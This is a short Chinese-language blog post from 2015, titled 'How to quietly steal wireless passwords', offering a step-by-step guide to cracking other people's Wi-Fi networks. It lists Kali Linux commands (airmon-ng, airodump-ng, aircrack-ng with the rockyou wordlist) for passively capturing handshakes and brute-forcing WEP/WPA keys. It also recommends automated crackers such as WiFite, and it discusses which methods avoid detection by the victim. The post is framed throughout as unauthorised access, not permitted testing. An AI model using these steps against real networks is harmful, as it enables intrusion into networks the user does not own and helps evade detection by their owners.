---
layout: post
title: "如何安静地窃取无线密码"
date: 2015-01-13 16:59
categories: 進芫
permalink: /how-to-sniffer-wifi-password-silently.html
identifier: how-to-sniffer-wifi-password-silently
---

作为一个安静的美男子，我们有时候需要安静的获得无线密码。  
常见的抓包破解、wps暴力破解、猥琐技巧破解都太暴力了，不适合我们。  

###**最Easy的办法**
手机下载万能WiFi密码，尝试一下，不行再进行以下的步骤。

###**安静的方法**

1. 下载[`Kali Linux`](http://kali.org)的VMware虚拟机镜像，插入无线网卡，分配无线网卡给虚拟机。  

2. `ifconfig`查看无线网卡的名字（一般是wlan0）。  

3. `airmon-ng start wlan0`，再`ifconfig`查看下新增了哪个（一般是`mon0`）。  

4. `airodump-ng -w xxx mon0`，xxx是保存的文件名。  

5. 新开一个窗口`tar zxvf /usr/share/wordlists/rockyou* -C /usr/share/wordlists/`  

6. `aircrack-ng xxx* -w /usr/share/wordlists/rockyou.txt`，选择WEP的，或者WPA handshake数量大于0的。  

7. 然后就是安静的坐等，运气好的话，刚回车就能有密码，运气不好rockyou.txt中一千四百多万个密码都不匹配。两种情况我都遇到过。  


###**暴力的方法**  
1. WiFite或者Fern-wifi-cracker，Kali中都有，傻瓜式，运气好一觉醒来就能收获几个密码。  


###**备注**  
1. 主动破解为了提升效率，有时需要使对方断网重连，容易被发现，也会给对方造成困扰。对方假如使用XX安全路由，也会检测到正在被攻击。    

2. 安静的方法被动接收数据，效率和可能性相对主动破解效率低非常多，但是完全不会被检测到，相对Gentle，适合在无线多的地方使用。  
被动接收不会被发现的原因参考[`这个帖子`](http://www.backtrack-linux.org/forums/showthread.php?t=13144)  